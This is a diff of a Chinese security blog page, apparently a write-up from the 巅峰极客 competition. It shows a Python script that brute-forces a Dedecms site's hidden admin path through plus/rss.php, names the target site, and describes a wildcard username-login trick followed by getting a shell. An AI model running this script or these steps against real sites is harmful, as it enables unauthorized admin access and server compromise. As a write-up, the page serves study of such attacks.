@@ -1,7 +1,85 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>Dedecms 猜后台管理员账号的一个小技巧</title>
-<link rel="stylesheet" href="/css/layout.css">
-<link rel="stylesheet" href="/css/main.css">
-<link rel="shortcut icon" href="/img/favicon.png"><meta name="generator" content="Hexo 5.2.0"></head><body><header class="base-menu"><div class="menu-wrapper"><div class="menu-layout-bg"></div><nav class="menu-content"><ul class="menu-list"><li class="menu-item"><a href="/" class="menu-link">雨了个雨's blog</a></li><li class="menu-item"><a href="/blog/archives" class="menu-link">Archives</a></li><li class="menu-item"><a href="/about" class="menu-link">About</a></li></ul></nav></div></header><header class="base-mobile-menu"><div class="mobile-menu-wrapper"><div class="menu-layout-bg"></div><nav class="menu-content"><ul class="menu-list"><li class="menu-item"><a href="/" class="menu-link">雨了个雨's blog</a></li><li class="menu-item"><a href="/blog/archives" class="menu-link">Archives</a></li><li class="menu-item"><a href="/about" class="menu-link">About</a></li></ul></nav><div id="mobile-menu-toggle" class="toggle-menu"><span class="menu-bar"></span><span class="menu-bar"> </span><span class="menu-bar"></span></div></div></header><div class="base-content"><div class="base-content-main"><article class="article-main"><h1 class="article-title">Dedecms 猜后台管理员账号的一个小技巧</h1><div class="article-meta"><p class="meta-item meta-time"><span class="meta-item-title">发表于: </span>2018-09-20</p><p class="meta-item meta-category"></p></div><div class="article-content"><p>巅峰极客里遇到的一个案例(yx-tv.com)。</p>
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Dedecms 猜后台管理员账号的一个小技巧 | 雨了个雨&#39;s blog</title>
+
+  
+  <meta name="author" content="雨了个雨">
+  
+
+  
+  <meta name="description" content="Focus On Web Security">
+  
+
+  
+  
+  <meta name="keywords" content="">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Dedecms 猜后台管理员账号的一个小技巧"/>
+
+  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">雨了个雨&#39;s blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Dedecms 猜后台管理员账号的一个小技巧</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/09/20/dedecms-guess-admin-username-trick/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-09-20T12:58:29.000Z">
+          2018-09-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>巅峰极客里遇到的一个案例(yx-tv.com)。</p>
 <p>案例为,windows下的dedecms 好像是2017版本, 开启了会员中心,修改了后台的路径,<br>然后用之前windows下dedecms找后台路径的方法, 发现tags.php被删除了,<br>但是plus/rss.php文件存在, 然后用这方法就成功的找到了后台。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">payloads &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_-&#39;</span><br><span class="line"></span><br><span class="line">menu &#x3D; &#39;&#39;</span><br><span class="line">for k in range(10):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        data &#x3D; &quot;dopost&#x3D;save&amp;_FILES[b4dboy][tmp_name]&#x3D;..&#x2F;%s%s&lt;&#x2F;images&#x2F;admin_top_logo.gif&amp;_FILES[b4dboy][name]&#x3D;0&amp;_FILES[b4dboy][size]&#x3D;0&amp;_FILES[b4dboy][type]&#x3D;image&#x2F;gif&quot;% (menu, payload)</span><br><span class="line">        res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;www.yx-tv.com&#x2F;plus&#x2F;rss.php&quot;, data&#x3D;data, headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;)</span><br><span class="line">        if res.content.decode(&quot;utf-8&quot;).find(&quot;Error&quot;) &gt; -1:</span><br><span class="line">            menu +&#x3D; payload</span><br><span class="line">            break</span><br><span class="line">        if payload &#x3D;&#x3D; &#39;-&#39;:</span><br><span class="line">            print(menu)</span><br><span class="line">            sys.exit()</span><br><span class="line">print(menu)</span><br></pre></td></tr></table></figure>
 
@@ -23,8 +101,47 @@
 <p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/dede_guess_1.jpg" alt="-w1406"></p>
 <p>所以在不知道管理员的用户名的情况下， 只要去用_跑一下, 当_的位数和管理员账户的位数相同时即可登录成功了。 </p>
 <p>巅峰极客的是4位数, 然后用之前修改管理员密码的洞修改的密码, 就成功登录了后台, 然后后台getshell, 就搞定了。</p>
-</div></article><div id="base-discus"></div></div></div><footer class="base-footer"><div class="footer-wrapper"><span>雨了个雨 Using </span><a target="_blank" rel="noopener" href="https://github.com/chuguixin/Simple"><span>Simple</span></a><span> Presents For You.</span></div></footer><div class="dom-ready">
-<script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
 
-<script src="/js/base.js"></script>
-</div></body></html>
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2020 雨了个雨
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
